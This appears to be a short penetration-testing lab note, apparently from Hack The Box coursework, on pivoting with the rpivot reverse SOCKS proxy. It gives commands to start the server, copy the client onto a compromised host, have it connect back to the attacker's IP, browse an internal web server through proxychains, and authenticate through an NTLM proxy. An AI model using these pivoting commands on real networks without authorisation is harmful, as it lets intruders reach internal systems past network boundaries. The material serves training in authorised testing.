Reverse SOCKS proxy. Uses SOCKS v4 by default.
```bash
la1n23@htb[/htb]$ git clone https://github.com/klsecservices/rpivot.git
la1n23@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# transfer rpivot to target
la1n23@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/

ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

# browse internal network webserver
la1n23@htb[/htb]$ proxychains firefox-esr 172.16.5.135:80
```
#### Connecting to a Web Server using HTTP-Proxy & NTLM Auth
```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

